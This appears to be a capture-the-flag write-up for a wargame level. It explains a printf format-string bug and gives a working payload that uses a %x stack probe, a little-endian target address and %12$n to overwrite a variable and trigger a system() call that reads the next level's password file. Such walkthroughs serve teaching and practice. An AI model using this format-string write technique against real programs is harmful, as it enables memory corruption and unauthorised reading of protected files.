See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.

We use the same idea as in the previous exercise: the printf function is vulnerable because it directly uses our input buffer as its format string.

We need to modify the value stored at 0x08049810 so that it becomes 0x1025544. If the comparison succeeds, the program executes:

system("/bin/cat /home/user/level5/.pass");

However, unlike the previous exercise, we cannot simply use A padding to reach 0x1025544, since 0x1025544 is much larger than the maximum input size.

We can instead use the field width feature of printf. A format such as %16930112x makes printf produce a very large number of characters without requiring them to be present in our input.

We first determine the position of our input in the arguments consumed by printf:

AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 41414141

0x41414141 is AAAA, so the first four bytes of our input are interpreted as the 12th argument.

We therefore place 0x08049810 at the beginning of the payload, encoded in little-endian:

\x10\x98\x04\x08

and use %12$n to tell printf to use the 12th argument as the destination address for %n.

The resulting payload is

python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' > /tmp/exploit

Then:

cat /tmp/exploit - | ./level4

This causes %12$n to write the desired value to 0x08049810, satisfying the comparison and reaching the system() call.